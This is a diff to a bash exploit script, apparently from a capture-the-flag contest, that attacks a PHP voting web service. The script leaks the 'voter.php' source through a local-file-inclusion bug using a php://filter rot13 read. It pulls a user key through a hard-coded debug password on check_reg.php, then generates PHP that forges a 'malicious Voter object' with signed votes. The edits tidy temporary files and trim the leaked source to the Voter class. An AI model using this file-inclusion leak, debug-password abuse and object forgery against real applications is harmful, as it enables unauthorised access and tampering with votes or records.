@@ -26,7 +26,7 @@ function cleanup() {
   sudo timedatectl set-ntp 1
   sleep 2s;
   echo "System date is now: `date`"
-  rm ".test.php" ".voter.php";
+  rm -f ".test.php" ".voter.php" ".voter.full.php";
 }
 
 trap cleanup EXIT
@@ -41,7 +41,7 @@ else
 fi
 
 # Phase 1: get voter.php, voterid and userkey
-VOTER_PHP=$(curl -s "${URL}inc.php?p=php://filter/string.rot13/resource=voter" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' > .voter.php) || failure "curl $LINENO"
+VOTER_PHP=$(curl -s "${URL}inc.php?p=php://filter/string.rot13/resource=voter" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' > .voter.full.php) || failure "curl $LINENO"
 VOTERID_RAW=$(curl -s "${URL}register.php" --data "name=$NAME&address=a&zip=12345&affiliation=Independent") || failure "curl $LINENO"
 VOTERID=$(echo $VOTERID_RAW | awk -F"word\">" '{print $2}' | awk -F"<" '{print $1}' | tr -d "[:blank:]")
 USERKEY_RAW=$(curl -s "${URL}check_reg.php?debugpw=thebluegrassstate" --data "id=${VOTERID}") || failure "curl $LINENO"
@@ -78,6 +78,11 @@ print(base64_encode(json_encode([$vote_s, $vote_s_sig, $voter->name, $name_sig])
 CODE
 )
 echo $PHP > ".test.php";
+
+# Remove everything but voter class from voter
+sed '/require_once("util.php");/,$d' .voter.full.php > .voter.php
+echo "?>" >> .voter.php
+
 
 if MODIFIED_VOTERID=$(php -f ".test.php"); then
   success "Created malicious Voter object"
